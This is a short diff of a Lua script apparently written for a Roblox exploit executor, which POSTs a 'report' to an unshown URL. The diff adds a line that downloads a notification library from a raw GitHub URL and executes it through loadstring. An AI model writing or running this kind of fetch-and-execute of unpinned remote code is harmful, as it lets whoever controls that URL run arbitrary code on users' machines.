@@ -1,3 +1,4 @@
+local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/ongshockingsituation/very-shocking-information/main/Notification%20Library"))()
 local exploits = identifyexecutor()
 local LP = game:GetService("Players")
 
@@ -17,8 +18,4 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
-game:GetService("StarterGui"):SetCore("SendNotification", { 
-	Title = "Report Sent";
-	Text = "Report Successfully Sent!";
-	Icon = "rbxthumb://type=Asset&id=11782547157&w=150&h=150"})
-Duration = 16;
+Notification:Create("Report: Message Sent!",5)
